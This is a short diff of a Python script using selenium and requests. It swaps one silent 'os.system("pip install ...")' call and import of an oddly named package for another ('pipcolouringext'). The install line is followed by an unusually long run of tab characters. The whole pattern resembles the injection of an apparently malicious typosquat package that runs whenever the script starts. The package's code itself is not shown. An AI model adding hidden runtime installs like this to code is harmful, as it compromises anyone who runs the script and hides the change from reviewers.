@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipcoloringsliberyV1")
-import pipcoloringsliberyV1
+os.system("pip install pipcolouringext")
+import pipcolouringext
 import requests																																																																																																																																																																																																																																																																					
 from selenium import webdriver
 from selenium.webdriver.firefox.options import Options
